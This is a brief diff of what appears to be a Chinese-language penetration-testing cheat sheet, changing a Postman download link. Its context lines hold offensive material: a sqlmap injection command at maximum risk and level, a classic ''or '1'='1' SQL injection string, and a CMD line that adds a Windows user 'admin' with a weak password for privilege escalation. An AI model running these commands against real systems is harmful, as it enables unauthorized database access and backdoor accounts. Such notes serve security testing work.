@@ -976,7 +976,7 @@ python sqlmap.py -r 123.log -p id -v 3 --dbms=oracle --risk=3 --level=5 --tamper
 'or '1'='1
 
 API 测试：Postman
-https://www.getpostman.com/apps
+https://www.getpostman.com/downloads/
 
 Windows 用户提权：
 CMD /C NET USER admin 123456 /ADD
